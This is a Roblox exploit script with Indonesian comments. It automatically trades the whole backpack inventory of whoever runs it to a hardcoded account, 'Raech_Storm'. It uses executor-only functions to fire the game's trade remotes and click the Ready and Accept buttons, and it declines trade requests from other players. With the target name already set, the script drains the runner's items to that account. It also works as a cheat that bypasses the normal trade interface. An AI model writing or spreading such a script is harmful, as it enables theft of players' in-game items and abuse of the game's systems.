local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

-- Masukkan nama akun penampung/tujuan di sini:
local TARGET_ACCOUNT_NAME = "Raech_Storm"

local function getTradeNetwork()
    local NetworkFolder = ReplicatedStorage:FindFirstChild("Network")
    if not NetworkFolder then return nil, nil end
    local TradeService = NetworkFolder:FindFirstChild("TradeService") or NetworkFolder:FindFirstChild("Trade")
    if not TradeService then return nil, nil end
    local TradeRE = TradeService:FindFirstChild("RE")
    return TradeService, TradeRE
end

-- ==========================================
-- PROTEKSI: AUTO DECLINE PERMINTAAN DARI PLAYER LAIN
-- ==========================================
local function enableAutoDeclineOtherPlayers(targetPlayerName)
    local _, TradeRE = getTradeNetwork()
    if not TradeRE then return end

    local respondRemote = TradeRE:FindFirstChild("RespondToRequest")
    local tradeEvent = TradeRE:FindFirstChild("TradeEvent")

    if tradeEvent and respondRemote then
        tradeEvent.OnClientEvent:Connect(function(eventName, data)
            -- Mendeteksi jika ada permintaan trade masuk dari player lain
            if eventName == "RequestReceived" or eventName == "TradeRequest" then
                local senderName = type(data) == "table" and (data.Sender or data.Name or data.Player) or tostring(data)
                local targetLower = string.lower(tostring(targetPlayerName))
                
                if type(senderName) == "string" and string.lower(senderName) ~= targetLower then
                    warn("[AutoTrade] Menolak permintaan trade dari player yang tidak dikenal: " .. senderName)
                    pcall(function()
                        respondRemote:FireServer(false, data) -- Tolak (decline)
                    end)
                end
            end
        end)
    end
end

local function resolveControllers()
    local Framework = ReplicatedStorage:WaitForChild("Framework", 10)
    if not Framework then return nil, nil end

    local DataControllerModule = Framework:WaitForChild("Features"):WaitForChild("Data"):WaitForChild("DataController", 5)
    local EntryRegistryModule = Framework:WaitForChild("Features"):WaitForChild("Inventory"):WaitForChild("EntryRegistry", 5)

    local DataController = nil
    local EntryRegistry = nil

    if DataControllerModule and DataControllerModule:IsA("ModuleScript") then
        local ok, dc = pcall(require, DataControllerModule)
        if ok and dc then DataController = dc end
    end

    if EntryRegistryModule and EntryRegistryModule:IsA("ModuleScript") then
        local ok, er = pcall(require, EntryRegistryModule)
        if ok and er then EntryRegistry = er end
    end

    return DataController, EntryRegistry
end

local function getInventoryTable(DataController)
    if not DataController or not DataController.Inventory then return nil end
    local ok, inv = pcall(function() return DataController.Inventory() end)
    if ok and type(inv) == "table" then return inv end
    if type(DataController.Inventory) == "table" then return DataController.Inventory end
    return nil
end

local function scanBackpackOnlyItems(DataController, EntryRegistry)
    local units = {}
    local itemMap = {}

    local inventory = getInventoryTable(DataController)
    if not inventory then return units, {} end

    for itemId, entry in pairs(inventory) do
        if type(entry) == "table" and type(entry.name) == "string" then
            local entryConfig = (EntryRegistry and type(EntryRegistry.getEntryConfig) == "function")
                and EntryRegistry.getEntryConfig(entry.name) or {}

            local kind = string.lower(entryConfig.kind or entry.kind or "")

            if kind ~= "unit" and kind ~= "pet" and kind ~= "character" then
                local currentQty = itemMap[entry.name] or 0
                itemMap[entry.name] = currentQty + (entry.amount or 1)
            end
        end
    end

    local items = {}
    for itemName, qty in pairs(itemMap) do
        table.insert(items, {
            name = itemName,
            qty = qty,
        })
    end

    return units, items
end

local function clickGuiButton(btn)
    if not btn then return end
    pcall(function()
        if firesignal then
            if btn.Activated then firesignal(btn.Activated) end
            if btn.MouseButton1Click then firesignal(btn.MouseButton1Click) end
        end
    end)
end

local function executeAutoTrade(targetPlayerName)
    if not targetPlayerName or targetPlayerName == "" or targetPlayerName == "NAMA_AKUN_PENAMPUNG_ANDA" then
        warn("[AutoTrade] HARAP ISI VARIABEL TARGET_ACCOUNT_NAME DENGAN USERNAME/DISPLAYNAME PENAMPUNG!")
        return
    end

    local targetLower = string.lower(tostring(targetPlayerName))
    local targetPlayer = nil

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            local pName = p.Name and string.lower(p.Name) or ""
            local pDisplay = p.DisplayName and string.lower(p.DisplayName) or ""
            
            if pName == targetLower or pDisplay == targetLower then
                targetPlayer = p
                break
            end
        end
    end

    if not targetPlayer then
        warn("[AutoTrade] Target player tidak ditemukan di server: " .. tostring(targetPlayerName))
        return
    end

    local _, TradeRE = getTradeNetwork()
    if not TradeRE then
        warn("[AutoTrade] TradeService.RE tidak ditemukan!")
        return
    end

    local reqRemote = TradeRE:FindFirstChild("RequestTrade")
    if not reqRemote then
        warn("[AutoTrade] Remote RequestTrade tidak ditemukan!")
        return
    end

    pcall(function() reqRemote:FireServer(targetPlayer) end)

    local sessionStarted = false
    local sessionEnded = false
    local tradeEventConn

    tradeEventConn = TradeRE.TradeEvent.OnClientEvent:Connect(function(eventName, data)
        if eventName == "Started" then
            sessionStarted = true
        elseif eventName == "Ended" then
            sessionEnded = true
        end
    end)

    local startTime = tick()
    while not sessionStarted and (tick() - startTime) < 35 do
        task.wait(0.3)
    end

    if not sessionStarted then
        tradeEventConn:Disconnect()
        warn("[AutoTrade] Timeout menunggu sesi trade.")
        return
    end

    task.wait(0.5)

    local DataController, EntryRegistry = resolveControllers()
    local _, currentItems = scanBackpackOnlyItems(DataController, EntryRegistry)

    local ChangeOffer = TradeRE:FindFirstChild("ChangeOffer")
    if ChangeOffer and currentItems and #currentItems > 0 then
        for _, item in ipairs(currentItems) do
            pcall(function()
                ChangeOffer:FireServer(item.name, item.qty)
            end)
            task.wait(0.25)
        end
    end

    task.wait(1.5)

    local advRemote = TradeRE:FindFirstChild("AdvanceTrade")
    if advRemote then
        pcall(function() advRemote:FireServer(true) end)
        pcall(function() advRemote:FireServer() end)
    end

    local function clickMatchingButton(candidates)
        local pGui = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:FindFirstChild("PlayerGui")
        if not pGui then return false end
        for _, btn in ipairs(pGui:GetDescendants()) do
            if btn:IsA("GuiButton") and btn.Visible then
                local txt = (btn:FindFirstChildWhichIsA("TextLabel") and btn:FindFirstChildWhichIsA("TextLabel").Text:lower()) or btn.Name:lower()
                for _, target in ipairs(candidates) do
                    if txt == target or txt:find(target) then
                        clickGuiButton(btn)
                        return true
                    end
                end
            end
        end
        return false
    end

    clickMatchingButton({"ready"})

    local acceptStartTime = tick()
    while not sessionEnded and (tick() - acceptStartTime) < 25 do
        task.wait(1)
        local clickedAccept = clickMatchingButton({"accept", "confirm"})
        if clickedAccept or (tick() - acceptStartTime) >= 4 then
            if advRemote then
                pcall(function() advRemote:FireServer(true) end)
                pcall(function() advRemote:FireServer() end)
            end
        end
    end

    task.wait(1.5)
    pcall(function() tradeEventConn:Disconnect() end)
end

task.spawn(function()
    enableAutoDeclineOtherPlayers(TARGET_ACCOUNT_NAME)
    task.wait(2)
    executeAutoTrade(TARGET_ACCOUNT_NAME)
end)
